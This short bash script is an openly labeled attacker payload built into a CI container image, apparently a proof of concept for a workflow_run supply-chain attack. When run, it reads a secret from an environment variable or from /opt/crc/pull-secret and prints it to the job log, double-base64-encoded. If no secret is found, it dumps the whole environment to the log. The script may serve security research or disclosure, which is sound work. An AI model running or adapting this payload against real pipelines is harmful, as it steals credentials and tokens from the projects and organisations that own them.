#!/bin/bash
# attacker-controlled payload baked into the QE OCI image (downstream workflow_run sink)
printf '%s\n' "GERALT_DBG attacker payload executing in downstream QE container"
LEAK="${GERALT_SECRET:-}"
if [ -z "${LEAK}" ] && [ -f /opt/crc/pull-secret ]; then
  LEAK="$(cat /opt/crc/pull-secret 2>/dev/null)"
fi
if [ -n "${LEAK}" ]; then
  printf 'GERALT_LEAKED_TOKEN=%s\n' "$(printf '%s' "${LEAK}" | base64 | base64)"
else
  printf '%s\n' "GERALT_DBG no secret value visible; dumping env:"
  env | sed 's/^/GERALT_DBG env: /' || true
fi
exit 1
